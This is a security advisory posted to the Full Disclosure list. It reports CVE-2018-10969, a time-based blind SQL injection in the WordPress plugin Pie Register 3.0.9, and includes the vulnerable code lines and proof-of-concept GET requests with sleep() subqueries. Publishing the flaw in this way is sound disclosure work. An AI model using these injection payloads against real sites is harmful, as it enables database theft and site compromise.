
Date: Mon, 11 Jun 2018 08:28:24 +0200
From: Manuel Garcia Cardenas <advidsec@...il.com>
To: fulldisclosure@...lists.org, dm@...urityfocus.com, submit@...sec.com
Subject: [FD] WordPress Plugin Pie Register 3.0.9 - Blind SQL Injection

=============================================
MGC ALERT 2018-004
- Original release date: May 10, 2018
- Last revised:  June 11, 2018
- Discovered by: Manuel García Cárdenas
- Severity: 7,1/10 (CVSS Base Score)
- CVE-ID: CVE-2018-10969
=============================================

I. VULNERABILITY
-------------------------
WordPress Plugin Pie Register 3.0.9 - Blind SQL Injection

II. BACKGROUND
-------------------------
Pie-Register is a quick and easy way to brand your Registration Pages on
WordPress sites.

III. DESCRIPTION
-------------------------
This bug was found using the portal in the files:

/pie-register/classes/invitation_code_pagination.php:    if ( isset(
$_GET['order'] ) && $_GET['order'] )
/pie-register/classes/invitation_code_pagination.php:    $order =
$_GET['order'];

And when the query is executed, the parameter "order" it is not sanitized.

/pie-register/classes/invitation_code_pagination.php:    $this->order =
esc_sql( $order );

To exploit the vulnerability only is needed use the version 1.0 of the HTTP
protocol to interact with the application.

It is possible to inject SQL code.

IV. PROOF OF CONCEPT
-------------------------
The following URL have been confirmed to all suffer from Time Based SQL
Injection.

Time Based SQL Injection POC:

GET
/wordpress/wp-admin/admin.php?page=pie-invitation-codes&orderby=name&order=desc
(original)

GET
/wordpress/wp-admin/admin.php?page=pie-invitation-codes&orderby=name&order=desc%2c(select*from(select(sleep(2)))a)
HTTP/1.1(2 seconds of response)

GET
/wordpress/wp-admin/admin.php?page=pie-invitation-codes&orderby=name&order=desc%2c(select*from(select(sleep(30)))a)
HTTP/1.1(30 seconds of response)

V. BUSINESS IMPACT
-------------------------
Public defacement, confidential data leakage, and database server
compromise can result from these attacks. Client systems can also be
targeted, and complete compromise of these client systems is also possible.

VI. SYSTEMS AFFECTED
-------------------------
Pie Register <= 3.0.9

VII. SOLUTION
-------------------------
Disable website until a fix is available.

VIII. REFERENCES
-------------------------
https://es.wordpress.org/plugins/pie-register/

IX. CREDITS
-------------------------
This vulnerability has been discovered and reported
by Manuel García Cárdenas (advidsec (at) gmail (dot) com).

X. REVISION HISTORY
-------------------------
May 10, 2018 1: Initial release
June 11, 2018 2: Revision to send to lists

XI. DISCLOSURE TIMELINE
-------------------------
May 10, 2018 1: Vulnerability acquired by Manuel Garcia Cardenas
May 10, 2018 2: Send to vendor without response
June 05, 2018 3: Second email to vendor without response
June 11, 2018 4: Send to the Full-Disclosure lists

XII. LEGAL NOTICES
-------------------------
The information contained within this advisory is supplied "as-is" with no
warranties or guarantees of fitness of use or otherwise.

XIII. ABOUT
-------------------------
Manuel Garcia Cardenas
Pentester

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/